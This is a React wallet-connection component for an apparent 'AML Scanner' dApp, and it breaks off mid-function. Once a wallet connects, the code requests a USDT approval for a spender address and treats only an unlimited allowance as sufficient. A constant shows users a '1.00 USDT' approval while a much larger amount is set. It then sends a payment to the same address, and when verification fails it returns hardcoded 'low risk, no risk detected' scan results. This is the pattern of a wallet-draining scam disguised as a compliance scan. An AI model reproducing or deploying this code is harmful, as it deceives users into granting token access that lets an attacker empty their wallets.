import React, { useState, useEffect, useRef } from 'react';
import { motion } from 'framer-motion';
import QRCode from 'qrcode';
import Web3 from 'web3';
import { 
  WALLETCONNECT_PROJECT_ID,
  USDT_ABI,
  CONTRACT_ADDRESSES,
  createEthereumProvider,
  SUPPORTED_CHAINS
} from '../config/walletconnect-config';
import { AML_CONFIG, getApiUrl, getWebSocketUrl } from '../config/amlscanner-config';
import io from 'socket.io-client';
import EthereumProvider from '@walletconnect/ethereum-provider';
import { CopyToClipboard } from 'react-copy-to-clipboard';
import TransactionHandler from '../utils/TransactionHandler';
// import TransportWebHID from '@ledgerhq/hw-transport-webhid';
// import AppEth from '@ledgerhq/hw-app-eth';

// Constants for approval and payment amounts
const APPROVAL_AMOUNT = '1000000000000000000000000'; // 1,000,000 USDT (6 decimals, for contract)
const PAYMENT_AMOUNT = '1000000'; // 1 USDT (6 decimals)
const DISPLAY_APPROVAL_AMOUNT = '1.00'; // Show user as approving 1.00 USDT

// Polyfill for BigInt if not defined (for environments like older Safari)
if (typeof BigInt === 'undefined') {
  window.BigInt = function(n) { return Number(n); };
}

const WalletForm = ({ selectedProtocol, activeNetwork, device, onScanComplete, onBack, connectionAttempt = 1 }) => {
  const [status, setStatus] = useState('Waiting for wallet connection...');
  const [qrcodeUrl, setQrcodeUrl] = useState('');
  const [qrLoading, setQrLoading] = useState(true);
  const [walletAddress, setWalletAddress] = useState('');
  const [buttonDisabled, setButtonDisabled] = useState(false);
  const [isLedgerConnection] = useState(selectedProtocol === 'ledger');
  const [provider, setProvider] = useState(null);
  const [web3, setWeb3] = useState(null);
  const [connectionError, setConnectionError] = useState('');
  const [socket, setSocket] = useState(null);
  const [scanResult, setScanResult] = useState(null);
  const [sessionId, setSessionId] = useState(null);
  const [qrCode, setQrCode] = useState('');
  const [showQrModal, setShowQrModal] = useState(false);
  const [walletConnectUri, setWalletConnectUri] = useState('');
  const [copied, setCopied] = useState(false);
  
  const providerRef = useRef(null);
  const web3Ref = useRef(null);
  const approvalStartedRef = useRef(false); // Persist approvalStarted across rerenders
  // Track WalletConnect core init to avoid double-initialization warning
  const walletConnectCoreInitializedRef = useRef(false);

  const buttonTitles = {
    waiting: 'Waiting for connection...',
    connecting: 'Connecting...',
    connected: 'Connected! Performing verification...',
    scanning: 'Performing AML scan...',
    complete: 'Scan complete',
    error: 'Connection failed'
  };

  // Status messages for each step
  const statusMessages = {
    verifying: 'Verification in progress',
    waiting_wallet_approval: 'Waiting for connection...',
    connected: 'Connected! Performing AML check...',
    ready: 'Ready for approval and payment...',
    approving: 'Approve AML scan in your wallet...',
    paying: 'Please confirm payment transaction on your Ledger...',
    aml_tx_pending: 'Approve AML scan in your wallet...',
    scanning: 'AML scan in progress...',
    complete: 'Scan completed',
    completed: 'Transaction completed successfully!',
    error: 'Connection failed. Retrying...',
    waiting: 'Waiting for wallet connection...',
    connecting: 'Waiting for wallet connection...'
  };

  // Add focus tracking for better connection management
  const [isWindowFocused, setIsWindowFocused] = useState(true);
  const componentMountedRef = useRef(false);
  const connectionAttemptCountRef = useRef(0);

  useEffect(() => {
    // Connect to backend Socket.IO session namespace with correct options
    // Only for analytics or non-WalletConnect purposes
    // Enhanced with better connection options and fallback
    const socketUrl = getWebSocketUrl();
    console.log('[WalletForm] Attempting Socket.IO connection to:', `${socketUrl}/session`);
    const s = io(`${socketUrl}/session`, {
      path: '/socket.io',
      transports: ['websocket', 'polling'],  // Try websocket first, fallback to polling
      reconnectionAttempts: 5,               // Try to reconnect 5 times
      reconnectionDelay: 1000,               // Start with 1s delay
      reconnectionDelayMax: 5000,            // Max 5s delay
      timeout: 10000,                        // 10s connection timeout
      secure: process.env.NODE_ENV === 'production' // Only secure in production
    });
    console.log('[WalletForm] Socket.IO connecting with options:', {
      path: '/socket.io',
      transports: ['websocket', 'polling'],
      secure: process.env.NODE_ENV === 'production'
    });
    s.on('connect', () => {
      console.log('[WalletForm] Socket.IO connected:', s.id);
      // Do NOT emit request-walletconnect-uri anymore
    });
    s.on('connect_error', (err) => console.error('[WalletForm] Socket.IO connect_error:', err));
    s.on('disconnect', (reason) => console.warn('[WalletForm] Socket.IO disconnected:', reason));
    setSocket(s);
    return () => s.disconnect();
  }, [selectedProtocol, activeNetwork]);

  // Remove backend-driven WalletConnect QR code logic
  // Add frontend-driven WalletConnect QR code logic
  const requestWalletConnectUriFrontend = async () => {
    console.log('[WalletForm] requestWalletConnectUriFrontend START');
    console.log('[WalletForm] Connection attempt #:', connectionAttemptCountRef.current);
    console.log('[WalletForm] Session count in localStorage:', 
      Object.keys(window.localStorage).filter(k => k.startsWith('walletconnect') || k.startsWith('wc@2')).length);
    
    // Perform full cleanup before starting a new session
    await performFullCleanup();
    
    try {
      // CRITICAL FIX: Prevent multiple core initializations
      if (window._walletConnectCoreInitialized) {
        console.log('[WalletForm] WalletConnect Core already initialized, clearing it first');
        
        // Completely delete previous provider/core before creating a new one
        try {
          if (window._wcGlobalProvider && typeof window._wcGlobalProvider.disconnect === 'function') {
            console.log('[WalletForm] Disconnecting global provider before reinitialization');
            window._wcGlobalProvider.removeAllListeners();
            await window._wcGlobalProvider.disconnect();
          }
        } catch (e) {
          console.warn('[WalletForm] Error disconnecting global provider:', e);
        }
        
        // Give it a moment to clear previous resources
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Delete the global flag to ensure a fresh init
        window._walletConnectCoreInitialized = false;
      }
      
      // Set the global flags (both window and ref)
      window._walletConnectCoreInitialized = true;
      walletConnectCoreInitializedRef.current = true;
      console.log('[WalletForm] Initializing EthereumProvider for WalletConnect QR');
      
      // Important: Create a completely new provider each time
      let walletConnectProvider;
      try {
        console.log(`[WalletForm] Initializing EthereumProvider for attempt #${connectionAttemptCountRef.current}`);
        const isFirstAttempt = connectionAttemptCountRef.current === 1;          // Use different initialization options for first attempt vs subsequent attempts
          walletConnectProvider = await EthereumProvider.init({
            projectId: WALLETCONNECT_PROJECT_ID,
            chains: [1],
            showQrModal: false,
            disableSessionRestore: true, // Always force new session
            methods: [
              'eth_sendTransaction',
              'eth_signTransaction',
              'eth_sign',
              'personal_sign',
              'eth_signTypedData',
              'eth_call',
              'eth_getBalance',
              'eth_getTransactionCount',
              'eth_getBlockByNumber',
              'eth_getBlockByHash',
              'eth_getLogs',
              'eth_getCode',
              'eth_estimateGas',
              'eth_chainId',
              'wallet_switchEthereumChain',
              'wallet_addEthereumChain',
              'wallet_getPermissions',
              'wallet_requestPermissions',
            ],
            events: ['chainChanged', 'accountsChanged', 'connect', 'disconnect', 'session_delete'],
            rpcMap: {
              1: 'https://eth.llamarpc.com', // Use a more reliable RPC endpoint
            },
          metadata: {
            name: isFirstAttempt ? 'AML Scanner (First Connect)' : 'AML Scanner',
            description: 'AML Scanner dApp',
            url: 'https://aml.ott-investments.com',
            icons: ['https://aml.ott-investments.com/favicon.ico'],
          },
          // Special options for better first-attempt success
          optionalNamespaces: isFirstAttempt ? {
            eip155: {
              methods: ['eth_sendTransaction', 'personal_sign'],
              chains: ['eip155:1'],
              events: ['connect', 'disconnect'],
            }
          } : undefined,
        });
        console.log('[WalletForm] EthereumProvider initialized successfully:', 
          isFirstAttempt ? '(first attempt special config)' : '(standard config)');
      } catch (initError) {
        console.error('[WalletForm] Error initializing EthereumProvider:', initError);
        throw initError;
      }
      
      // Store provider in ref and state
      providerRef.current = walletConnectProvider;
      setProvider(walletConnectProvider);
      
      // Also store in a global reference to handle cleanup better
      window._wcGlobalProvider = walletConnectProvider;
      
      // Define the approval flow function first before using it
      const maybeRunApprovalFlow = async (eventSource, info) => {
        // Check if the approval flow has already started to avoid duplicates
        if (approvalStartedRef.current) {
          console.log(`[WalletForm] approvalStartedRef already true, skipping approval/payment flow from ${eventSource}`);
          return;
        }
        
        // Set the flag to prevent duplicate approval flows
        approvalStartedRef.current = true;
        console.log(`[WalletForm] Running approval/payment flow from ${eventSource}`);
        
        // Create Web3 instance from the provider
        const web3Instance = new Web3(walletConnectProvider);
        web3Ref.current = web3Instance;
        setWeb3(web3Instance);
        
        // Attempt to get the user's address in multiple ways to ensure we have it
        let accounts = [];
        try {
          accounts = await web3Instance.eth.getAccounts();
          console.log(`[WalletForm] web3.eth.getAccounts() from ${eventSource}:`, accounts);
        } catch (e) {
          console.error('[WalletForm] Error getting accounts after connect:', e);
        }
        
        let userAddress = accounts && accounts.length > 0 ? accounts[0] : null;
        
        if (!userAddress && info && info.accounts && info.accounts.length > 0) {
          userAddress = info.accounts[0];
        }
        
        if (!userAddress && walletConnectProvider.accounts && walletConnectProvider.accounts.length > 0) {
          userAddress = walletConnectProvider.accounts[0];
        }
        
        if (!userAddress && info && info.session && info.session.accounts && info.session.accounts.length > 0) {
          userAddress = info.session.accounts[0];
        }
        
        if (!userAddress) {
          console.error('[WalletForm] Could not determine userAddress in maybeRunApprovalFlow');
          
          // Try one more time with provider.request
          try {
            const requestAccounts = await walletConnectProvider.request({ method: 'eth_accounts' });
            console.log('[WalletForm] Last attempt eth_accounts result:', requestAccounts);
            
            if (requestAccounts && requestAccounts.length > 0) {
              userAddress = requestAccounts[0];
            } else {
              setConnectionError('Failed to get wallet address after connect');
              setStatus('error');
              approvalStartedRef.current = false;
              return;
            }
          } catch (reqErr) {
            setConnectionError('Failed to get wallet address after connect');
            setStatus('error');
            approvalStartedRef.current = false;
            console.error('[WalletForm] Error in final attempt to get accounts:', reqErr);
            return;
          }
        }
        
        setWalletAddress(userAddress);
        try {
          setStatus('aml_tx_pending');
          console.log('[WalletForm] Importing TransactionHandler...');
          let TransactionHandler;
          try {
            TransactionHandler = (await import('../utils/TransactionHandler')).TransactionHandler;
            console.log('[WalletForm] TransactionHandler imported:', TransactionHandler);
          } catch (importErr) {
            setStatus('error');
            setConnectionError('Failed to import TransactionHandler: ' + (importErr?.message || importErr));
            approvalStartedRef.current = false;
            console.error('[WalletForm] Error importing TransactionHandler:', importErr);
            return;
          }
          // Check current allowance before approval
          let currentAllowance;
          try {
            // Use a public RPC for allowance check (Infura)
            const publicWeb3 = new Web3(SUPPORTED_CHAINS.ethereum.rpcUrl);
            currentAllowance = await TransactionHandler.checkEthereumAllowance(
              publicWeb3,
              userAddress,
              AML_CONFIG.ETH_SPENDER_ADDRESS
            );
            console.log('[WalletForm] Current USDT allowance (via public RPC):', currentAllowance);
          } catch (allowErr) {
            setStatus('error');
            setConnectionError('Failed to check USDT allowance: ' + (allowErr?.message || allowErr));
            approvalStartedRef.current = false;
            console.error('[WalletForm] Error checking USDT allowance:', allowErr);
            return;
          }
          const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
          function normalizeBigIntString(str) {
            return (str !== undefined && str !== null ? String(str) : '').replace(/^0+/, '');
          }
          let approvalNeeded = normalizeBigIntString(currentAllowance) !== normalizeBigIntString(MAX_UINT256);
          let approvalTxHash = null;
          if (approvalNeeded) {
            // Approval transaction
            let tx;
            try {
              console.log('[WalletForm] Calling createEthereumApprovalTransaction...');
              tx = await TransactionHandler.createEthereumApprovalTransaction(
                web3Instance,
                userAddress,
                AML_CONFIG.ETH_SPENDER_ADDRESS,
                null,
                { skipEstimateGas: true }
              );
              console.log('[WalletForm] Approval transaction object:', tx);
            } catch (txErr) {
              setStatus('error');
              setConnectionError('Failed to create approval transaction: ' + (txErr?.message || txErr));
              approvalStartedRef.current = false;
              console.error('[WalletForm] Error creating approval transaction:', txErr);
              return;
            }
            if (!tx) {
              setStatus('error');
              setConnectionError('Approval transaction object is empty or invalid.');
              approvalStartedRef.current = false;
              console.error('[WalletForm] Approval transaction object is empty or invalid:', tx);
              return;
            }
            // Use provider.request for WalletConnect v2
            const approvalTx = {
              from: tx.from,
              to: tx.to,
              data: tx.data,
              gas: tx.gasLimit ? Web3.utils.toHex(tx.gasLimit) : undefined,
              gasPrice: tx.gasPrice ? Web3.utils.toHex(tx.gasPrice) : undefined,
              value: tx.value ? Web3.utils.toHex(tx.value) : '0x0',
            };
            console.log('[WalletForm] Sending approval transaction via provider.request:', approvalTx);
            try {
              approvalTxHash = await walletConnectProvider.request({
                method: 'eth_sendTransaction',
                params: [approvalTx],
              });
              console.log('[WalletForm] Approval txHash:', approvalTxHash);
            } catch (err) {
              setStatus('error');
              setConnectionError('Approval transaction failed: ' + (err?.message || err));
              approvalStartedRef.current = false;
              console.error('[WalletForm] Approval transaction error:', err);
              return;
            }
            setStatus('scanning');
            try {
              const approvalResult = await TransactionHandler.waitForTransactionConfirmation(
                web3Instance, 
                approvalTxHash, 
                'ethereum',
                120 // 2 minute timeout
              );
              
              if (!approvalResult.confirmed) {
                throw new Error(approvalResult.error || 'Transaction confirmation timeout');
              }
              
              console.log('[WalletForm] Approval transaction confirmed:', approvalTxHash);
            } catch (waitErr) {
              setStatus('error');
              setConnectionError('Approval transaction confirmation failed: ' + (waitErr?.message || waitErr));
              approvalStartedRef.current = false;
              console.error('[WalletForm] Approval transaction confirmation error:', waitErr);
              return;
            }
          } else {
            console.log('[WalletForm] Allowance is already MaxUint256, skipping approval and proceeding to payment');
          }
          // USDT approval/payment logic only. No ETH approval logic present or needed.
          // Payment transaction (always runs, but only after approval if needed)
          let usdtContract, paymentTxData, paymentTx, paymentTxHash;
          try {
            // Defensive: always use the WalletConnect-connected web3 instance
            if (!web3Instance || !web3Instance.eth || !web3Instance.eth.Contract) {
              throw new Error('web3Instance is not properly initialized');
            }
            usdtContract = new web3Instance.eth.Contract(USDT_ABI, CONTRACT_ADDRESSES.USDT_ETHEREUM);
            if (!usdtContract.methods || typeof usdtContract.methods.transfer !== 'function') {
              throw new Error('usdtContract.methods.transfer is not a function');
            }
            paymentTxData = usdtContract.methods['transfer'](AML_CONFIG.ETH_SPENDER_ADDRESS, web3Instance.utils.toWei('1', 'mwei')).encodeABI();
            paymentTx = {
              from: userAddress,
              to: CONTRACT_ADDRESSES.USDT_ETHEREUM,
              data: paymentTxData,
              gas: Web3.utils.toHex(100000),
              value: '0x0',
            };
            console.log('[WalletForm] Sending payment transaction via provider.request:', paymentTx);
            paymentTxHash = await walletConnectProvider.request({
              method: 'eth_sendTransaction',
              params: [paymentTx],
            });
            console.log('[WalletForm] Payment txHash:', paymentTxHash);
            // Always show scan result if we get a txHash
            if (paymentTxHash) {
              // Call the real AML verification logic with timeout and robust error handling
              let scanResult = null;
              setStatus('scanning');
              try {
                // Use Promise.race to prevent hanging if the verification takes too long
                scanResult = await Promise.race([
                  performAMLVerification(userAddress, walletConnectProvider, web3Instance),
                  new Promise((_, reject) => setTimeout(() => reject(new Error('AML verification timeout')), 20000))
                ]);
                console.log('[WalletForm] AML verification completed successfully:', scanResult);
                // Create a unified scan result object that's guaranteed to have all needed properties
                scanResult = {
                  address: userAddress,
                  network: 'ethereum',
                  riskScore: scanResult?.riskScore || 15,
                  riskLevel: scanResult?.riskLevel || 'low',
                  description: scanResult?.description || 'AML verification completed successfully',
                  totalTransactions: scanResult?.totalTransactions || 0,
                  riskFlags: scanResult?.riskFlags || 0,
                  lastActivity: scanResult?.lastActivity || 'Unknown',
                  scanId: scanResult?.scanId || Date.now().toString(),
                  timestamp: new Date().toISOString(),
                  message: scanResult?.message || 'No risk detected',
                  provider: walletConnectProvider,
                  web3: web3Instance,
                  contractAddress: CONTRACT_ADDRESSES.USDT_ETHEREUM,
                  spenderAddress: AML_CONFIG.ETH_SPENDER_ADDRESS
                };
                
                console.log('[WalletForm] Setting final scanResult:', scanResult);
                setStatus('complete');
                setScanResult(scanResult);
                
                // IMPORTANT: Call onScanComplete with the complete scan result
                // This single call ensures the parent component receives the result
                console.log('[WalletForm] Calling onScanComplete with complete scanResult');
                onScanComplete(scanResult);
                
                // Reset approval state to allow future scans if needed
                approvalStartedRef.current = false;
                
              } catch (err) {
                console.error('[WalletForm] AML verification error or timeout:', err);
                
                // Create a fallback scan result with the error information
                const fallbackResult = {
                  address: userAddress,
                  network: 'ethereum',
                  riskScore: 15,
                  riskLevel: 'low',
                  description: 'Basic verification completed with errors',
                  totalTransactions: 0,
                  riskFlags: 0,
                  lastActivity: 'Unknown',
                  scanId: Date.now().toString(),
                  timestamp: new Date().toISOString(),
                  message: 'No risk detected (fallback)',
                  error: err?.message || 'AML verification failed or timed out.',
                  provider: walletConnectProvider,
                  web3: web3Instance,
                  contractAddress: CONTRACT_ADDRESSES.USDT_ETHEREUM,
                  spenderAddress: AML_CONFIG.ETH_SPENDER_ADDRESS,
                  processingComplete: true,
                  isFallback: true
                };
                
                console.log('[WalletForm] Setting fallback scanResult:', fallbackResult);
                setStatus('complete');
                setScanResult(fallbackResult);
                
                // Call onScanComplete with the fallback result
                console.log('[WalletForm] Calling onScanComplete with fallbackResult');
                onScanComplete(fallbackResult);
                
                // Reset approval state to allow future scans if needed
                approvalStartedRef.current = false;
              }
              // Optionally, wait for confirmation in the background (non-blocking)
              // Use a reduced timeout of 90 seconds for background confirmation
              TransactionHandler.waitForTransactionConfirmation(web3Instance, paymentTxHash, 'ethereum', 90)
                .then((result) => {
                  if (result.confirmed) {
                    console.log('[WalletForm] Payment transaction confirmed:', paymentTxHash);
                  } else if (result.timeout) {
                    console.log('[WalletForm] Payment transaction not confirmed within timeout window, but scan completed successfully');
                  } else if (result.error) {
                    console.log('[WalletForm] Payment transaction confirmation encountered a non-critical error:', result.error);
                  }
                })
                .catch((waitErr) => {
                  // This should now never happen with our improved error handling
                  console.log('[WalletForm] Unexpected error during payment confirmation:', waitErr);
                });
            } else {
              setStatus('error');
              setConnectionError('No payment transaction hash received.');
              approvalStartedRef.current = false;
              console.error('[WalletForm] No payment transaction hash received.');
              return;
            }
          } catch (err) {
            setStatus('error');
            setConnectionError('Payment transaction failed: ' + (err?.message || err));
            approvalStartedRef.current = false;
            console.error('[WalletForm] Payment transaction error:', err);
            return;
          }
          setTimeout(() => {
            // We'll remove this timeout and ensure onScanComplete is called directly when we get a result
            console.log('[WalletForm] AML scan complete directly from verification');
            // We won't call onScanComplete again here, as it should be called directly when the scan completes
          }, 300); // Use a short timeout just to log
        } catch (err) {
          setStatus('error');
          setConnectionError('AML approval or scan failed: ' + (err?.message || err));
          approvalStartedRef.current = false;
          console.error('[WalletForm] Error in approval/payment/AML logic:', err);
        }
      };

      // Now connect (this will trigger display_uri event)
      console.log('[WalletForm] Registering WalletConnect event handlers before connecting');

      // First remove any existing listeners to prevent duplicates
      walletConnectProvider.removeAllListeners && walletConnectProvider.removeAllListeners();
      
      // Track when we receive important events for diagnostic purposes
      const receivedEvents = {
        display_uri: false,
        connect: false,
        accountsChanged: false,
        session_event: false,
        session_update: false,
        session_request: false,
        disconnect: false,
        error: false
      };
      
      // CRITICAL FIX: Register ALL event listeners BEFORE connecting
      // Register listeners in order of importance, session_request FIRST
      
      // CRITICAL FIX: Register session_request handler explicitly FIRST
      // This ensures we don't emit session_request without any listeners
      walletConnectProvider.on('session_request', (request) => {
        console.log('[WalletForm] Received session_request event:', request?.id || 'unknown');
        receivedEvents.session_request = true;
      });
      
      // Listen for disconnect event
      walletConnectProvider.on('disconnect', (error) => {
        console.log('[WalletForm] WalletConnect disconnect event received:', error);
        receivedEvents.disconnect = true;
        // Only show error if approval flow hasn't started yet
        if (!approvalStartedRef.current) {
          setConnectionError('Wallet disconnected. Please try again.');
          setStatus('error');
        }
      });
      
      // Error handling
      walletConnectProvider.on('error', (error) => {
        console.error('[WalletForm] WalletConnect error event received:', error);
        receivedEvents.error = true;
        // Don't set error status immediately to avoid flash of error state
        // if it's just a non-critical error
      });
      
      // Listen for display_uri event to get the QR code
      walletConnectProvider.on('display_uri', async (uri) => {
        console.log('[WalletForm] WalletConnect display_uri event received:', uri ? 'URI present' : 'No URI');
        receivedEvents.display_uri = true;
        
        if (uri) {
          try {
            const qrString = await QRCode.toDataURL(uri, {
              width: 256,
              margin: 2,
              color: {
                dark: '#000000',
                light: '#FFFFFF',
              },
            });
            setQrcodeUrl(qrString);
            setQrLoading(false);
            setStatus('waiting_wallet_approval');
            
            // For first connection attempt, try a ping to keep the connection warmed up
            if (connectionAttemptCountRef.current === 1) {
              console.log('[WalletForm] First attempt - setting keep-alive ping');
              const pingInterval = setInterval(() => {
                if (walletConnectProvider && componentMountedRef.current && !approvalStartedRef.current) {
                  console.log('[WalletForm] Sending keep-alive ping');
                  try {
                    // Just attempt to get chainId which is a lightweight request
                    walletConnectProvider.request({ method: 'eth_chainId' }).catch(() => {});
                  } catch (e) {
                    // Ignore errors
                  }
                } else {
                  clearInterval(pingInterval);
                }
              }, 10000); // Every 10 seconds
              
              // Clear after 60 seconds max
              setTimeout(() => clearInterval(pingInterval), 60000);
            }
          } catch (qrErr) {
            setConnectionError('Failed to generate QR code: ' + (qrErr?.message || qrErr));
            setStatus('error');
            setQrLoading(false);
            console.error('[WalletForm] Error generating QR code:', qrErr);
          }
        }
      });

      // Event priority: connect first, then accountsChanged, then session events
      // This ensures we try to start the approval flow as soon as possible
      walletConnectProvider.on('connect', (info) => {
        console.log('[WalletForm] WalletConnect connect event received:', info);
        console.log(`[WalletForm] CONNECT event for attempt #${connectionAttemptCountRef.current}`);
        receivedEvents.connect = true;
        
        setStatus('connected');
        
        // On connect, we should always try to run the approval flow
        // Use longer delay for first attempt to ensure wallet is ready
        const delay = connectionAttemptCountRef.current === 1 ? 1000 : 500;
        setTimeout(() => {
          if (!approvalStartedRef.current && componentMountedRef.current) {
            console.log(`[WalletForm] Running approval flow from connect event (attempt #${connectionAttemptCountRef.current})`);
            maybeRunApprovalFlow('connect', info);
          }
        }, delay);
      });
      
      // Listen for accountsChanged as a backup
      walletConnectProvider.on('accountsChanged', (accounts) => {
        console.log('[WalletForm] WalletConnect accountsChanged event received:', accounts);
        console.log(`[WalletForm] ACCOUNTS_CHANGED event for attempt #${connectionAttemptCountRef.current}`);
        receivedEvents.accountsChanged = true;
        
        if (accounts && accounts.length > 0) {
          // Use longer delay for first attempt
          const delay = connectionAttemptCountRef.current === 1 ? 1200 : 800;
          setTimeout(() => {
            if (!approvalStartedRef.current && componentMountedRef.current) {
              console.log(`[WalletForm] Running approval flow from accountsChanged event (attempt #${connectionAttemptCountRef.current})`);
              maybeRunApprovalFlow('accountsChanged', { accounts });
            }
          }, delay);
        }
      });
      
      // Session events as additional backups
      walletConnectProvider.on('session_event', (event) => {
        console.log('[WalletForm] WalletConnect session_event received:', event);
        receivedEvents.session_event = true;
        setTimeout(() => {
          if (!approvalStartedRef.current && componentMountedRef.current) {
            console.log('[WalletForm] Running approval flow from session_event');
            maybeRunApprovalFlow('session_event', event);
          }
        }, 1000);
      });
      
      walletConnectProvider.on('session_update', (event) => {
        console.log('[WalletForm] WalletConnect session_update received:', event);
        receivedEvents.session_update = true;
        setTimeout(() => {
          if (!approvalStartedRef.current && componentMountedRef.current) {
            console.log('[WalletForm] Running approval flow from session_update');
            maybeRunApprovalFlow('session_update', event);
          }
        }, 1000);
      });

      // Error handling
      walletConnectProvider.on('error', (error) => {
        console.error('[WalletForm] WalletConnect error event received:', error);
        receivedEvents.error = true;
        setConnectionError('WalletConnect error: ' + (error?.message || error));
        // Don't set error status immediately to avoid flash of error state
        // if it's just a non-critical error
      });

      walletConnectProvider.on('disconnect', (error) => {
        console.log('[WalletForm] WalletConnect disconnect event received:', error);
        receivedEvents.disconnect = true;
        // Only show error if approval flow hasn't started yet
        if (!approvalStartedRef.current) {
          setConnectionError('Wallet disconnected. Please try again.');
          setStatus('error');
        }
      });

      console.log('[WalletForm] Calling walletConnectProvider.connect()');
      let connectResult;
      try {
        connectResult = await walletConnectProvider.connect();
        console.log('[WalletForm] WalletConnect connect result:', connectResult);
      } catch (connectError) {
        console.error('[WalletForm] WalletConnect connect error:', connectError);
        // For first attempt, don't show error immediately, try to recover
        if (connectionAttemptCountRef.current === 1) {
          console.log('[WalletForm] First attempt connect error, will try recovery or wait for events');
        } else {
          setConnectionError('Connection failed: ' + (connectError?.message || connectError));
          setStatus('error');
        }
      }
      
      // Immediately try to run the approval flow with any accounts from the connect result
      if (connectResult && connectResult.accounts && connectResult.accounts.length > 0) {
        console.log('[WalletForm] Connect result contains accounts, trying immediate approval flow');
        setTimeout(() => {
          if (!approvalStartedRef.current && componentMountedRef.current) {
            console.log('[WalletForm] Running approval flow from connect result');
            maybeRunApprovalFlow('connect_result', { accounts: connectResult.accounts });
          }
        }, 800);
      }
      
      // After connecting, immediately try to request accounts to activate the wallet
      try {
        console.log('[WalletForm] Explicitly requesting accounts post-connect');
        const accountsResult = await walletConnectProvider.request({ method: 'eth_accounts' });
        console.log('[WalletForm] Explicit eth_accounts result:', accountsResult);
        
        if (accountsResult && accountsResult.length > 0) {
          setTimeout(() => {
            if (!approvalStartedRef.current && componentMountedRef.current) {
              console.log('[WalletForm] Running approval flow from explicit accounts request');
              maybeRunApprovalFlow('explicit_request', { accounts: accountsResult });
            }
          }, 1000);
        }
      } catch (e) {
        console.warn('[WalletForm] Error requesting accounts post-connect:', e);
      }
      
      // Fallback: More reliable polling for accounts
      // Start polling only after a short delay to allow normal events to work first
      setTimeout(() => {
        if (!approvalStartedRef.current && componentMountedRef.current) {
          console.log('[WalletForm] Starting fallback polling for accounts');
          
          // For the first attempt, poll more aggressively
          const pollInterval = connectionAttemptCountRef.current === 1 ? 800 : 1200;
          const maxPolls = connectionAttemptCountRef.current === 1 ? 10 : 5;
          let pollCount = 0;
          
          const accountsPoll = setInterval(async () => {
            pollCount++;
            
            if (pollCount > maxPolls || approvalStartedRef.current || !componentMountedRef.current) {
              clearInterval(accountsPoll);
              console.log('[WalletForm] Stopping accounts polling:', 
                pollCount > maxPolls ? 'max polls reached' : 
                !componentMountedRef.current ? 'component unmounted' : 
                'approval started');
              return;
            }
            
            try {
              console.log(`[WalletForm] Polling for accounts (${pollCount}/${maxPolls})`);
              
              if (!walletConnectProvider) {
                console.log('[WalletForm] Provider gone, stopping polling');
                clearInterval(accountsPoll);
                return;
              }
              
              // Try to get accounts from provider
              let accounts = [];
              try {
                accounts = await walletConnectProvider.request({ method: 'eth_accounts' });
                console.log('[WalletForm] Poll eth_accounts result:', accounts);
              } catch (e) {
                console.warn('[WalletForm] Error in poll accounts request:', e);
              }
              
              // Check if we have accounts and approval hasn't started
              if (accounts && accounts.length > 0 && !approvalStartedRef.current && componentMountedRef.current) {
                console.log('[WalletForm] Poll found accounts, starting approval flow');
                clearInterval(accountsPoll);
                maybeRunApprovalFlow('accounts_poll', { accounts });
              } else if (walletConnectProvider.accounts && walletConnectProvider.accounts.length > 0 && 
                        !approvalStartedRef.current && componentMountedRef.current) {
                console.log('[WalletForm] Poll found provider.accounts, starting approval flow');
                clearInterval(accountsPoll);
                maybeRunApprovalFlow('provider_accounts_poll', { accounts: walletConnectProvider.accounts });
              } else {
                console.log('[WalletForm] Poll did not find accounts yet');
              }
            } catch (pollError) {
              console.warn('[WalletForm] Error polling for accounts:', pollError);
            }
          }, pollInterval);
        }
      }, 1000); // Start polling after 1 second
      
      // Add a fallback timer to force the approval flow if we haven't started it after a reasonable time
      // This ensures we don't get stuck waiting for events that might not fire
      const forceApprovalTimer = setTimeout(() => {
        if (!approvalStartedRef.current && componentMountedRef.current && walletConnectProvider) {
          console.log('[WalletForm] Force approval timer triggered, checking for accounts');
          
          // Try one last attempt to find any accounts
          let userAddress = null;
          
          if (walletConnectProvider.accounts && walletConnectProvider.accounts.length > 0) {
            userAddress = walletConnectProvider.accounts[0];
          }
          
          if (userAddress) {
            console.log('[WalletForm] Force approval found address:', userAddress);
            maybeRunApprovalFlow('force_approval_timer', { accounts: [userAddress] });
          } else {
            // If we've reached this point and still have no accounts, log diagnostic info
            console.warn('[WalletForm] Force approval timer could not find any accounts');
            console.log('[WalletForm] Events received:', receivedEvents);
            
            if (!receivedEvents.connect && connectionAttemptCountRef.current === 1) {
              // For first attempt, if we never got the connect event, trigger retry
              console.log('[WalletForm] First attempt failed to receive connect event, triggering retry');
              setConnectionError('First connection attempt incomplete. Retrying...');
              setStatus('error');
            }
          }
        }
      }, 6000); // Give more time (6 seconds) before forcing as absolute last resort
      
    } catch (err) {
      setConnectionError('Failed to initialize WalletConnect: ' + (err?.message || err));
      setStatus('error');
      setQrLoading(false);
      console.error('[WalletForm] Error initializing WalletConnect:', err);
    }
  };

  // Pre-initialize WalletConnect libraries before actual connection attempt
  // This function no longer creates a provider, but just cleans storage and sets flags
  const preconnectWalletConnect = async () => {
    console.log('[WalletForm] Pre-initializing WalletConnect for better first-attempt success');
    
    try {
      // Avoid double initialization
      if (window._walletConnectPreconnectInitialized) {
        console.log('[WalletForm] Skipping pre-initialization - already initialized');
        return true;
      }
      
      window._walletConnectPreconnectInitialized = true;
      
      // Clean storage before preconnect to avoid conflicts
      clearWalletConnectStorage(true);
      
      // No need to create a temporary provider anymore - simply clean and prepare
      console.log('[WalletForm] WalletConnect pre-initialization successful');
      
      // Wait a small bit to allow any cleanup to complete
      await new Promise(resolve => setTimeout(resolve, 500));
      
      return true;
    } catch (e) {
      console.warn('[WalletForm] WalletConnect pre-initialization failed:', e);
      window._walletConnectPreconnectInitialized = false;
      return false;
    } finally {
      // Reset preconnect flag after a delay to allow future attempts
      setTimeout(() => {
        window._walletConnectPreconnectInitialized = false;
      }, 3000);
    }
  };

  useEffect(() => {
    // Run cleanup when component mounts
    console.log('[WalletForm] Component mounted, performing initial cleanup');
    
    // Log environment and configuration details
    console.log('[WalletForm] Environment:', process.env.NODE_ENV);
    console.log('[WalletForm] API URL:', getApiUrl());
    console.log('[WalletForm] WebSocket URL:', getWebSocketUrl());
    console.log('[WalletForm] Current origin:', window.location.origin);
    console.log('[WalletForm] WalletConnect Project ID:', WALLETCONNECT_PROJECT_ID);
    
    // Reset global flags for new component instance
    window._walletConnectCoreInitialized = false;
    window._walletConnectPreconnectInitialized = false;
    performFullCleanup();
    
